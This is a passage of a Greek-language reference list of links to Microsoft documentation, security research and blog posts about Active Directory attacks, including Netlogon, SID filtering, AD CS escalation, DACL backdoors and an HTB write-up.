- [10] [Microsoft - Πώς να διαχειριστείτε τις αλλαγές στις συνδέσεις ασφαλούς καναλιού Netlogon που σχετίζονται με το CVE-2020-1472](https://support.microsoft.com/en-us/topic/how-to-manage-the-changes-in-netlogon-secure-channel-connections-associated-with-cve-2020-1472-f7e8cc17-0309-1d6a-304e-5ba73cd1a11e)
- [11] [Ένα ταξίδι στις ξεχασμένες διεπαφές Null Session και MS-RPC](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
- [12] [Το SID filter ως όριο ασφαλείας μεταξύ domains; (Μέρος 4) - Έρευνα παράκαμψης του SID filtering](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)
- [13] [Το SID filter ως όριο ασφαλείας μεταξύ domains; (Μέρος 5) - Επίθεση trust με Golden GMSA - από child σε parent](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-5)
- [14] [Το SID filter ως όριο ασφαλείας μεταξύ domains; (Μέρος 6) - Επίθεση trust μέσω αλλαγής Schema - από child σε parent](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-6)
- [15] [Από DA σε EA με ESC5](https://specterops.io/blog/2023/05/16/from-da-to-ea-with-esc5/)
- [16] [Κλιμάκωση από admins child domain σε enterprise admins σε 5 λεπτά μέσω κατάχρησης του AD CS, συνέχεια](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/)
- [17] [Ένας ACE στο μανίκι: Σχεδιασμός DACL backdoors στο Active Directory](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)
- [18] [Πηγαίος κώδικας του module pre2k του NetExec](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/pre2k.py)
- [19] [Microsoft ADSchema - Attribute msDS-GroupMSAMembership](https://learn.microsoft.com/en-us/windows/win32/adschema/a-msds-groupmsamembership)
- [20] [0xdf - HTB Pirate](https://0xdf.gitlab.io/2026/09/05/htb-pirate.html)
